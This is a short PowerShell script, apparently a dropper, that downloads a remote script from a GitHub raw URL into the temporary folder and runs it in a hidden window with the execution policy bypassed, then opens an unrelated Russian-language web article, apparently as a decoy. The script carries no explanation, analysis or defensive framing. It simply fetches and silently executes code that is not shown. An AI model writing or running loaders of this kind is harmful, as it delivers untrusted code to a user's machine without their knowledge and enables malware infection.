$src  = "https://raw.githubusercontent.com/AnatolikFFF/Pikachucha/refs/heads/main/1st.ps1"
$dest = Join-Path $env:TEMP "1st.ps1"

Invoke-WebRequest -Uri $src -OutFile $dest

Start-Process -FilePath "powershell.exe" `
  -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File",$dest) `
  -WindowStyle Hidden

Start-Process "https://dzen.ru/a/Zbs3u3lnWFp14BnD?ysclid=mqw1yr1d3m810248042"
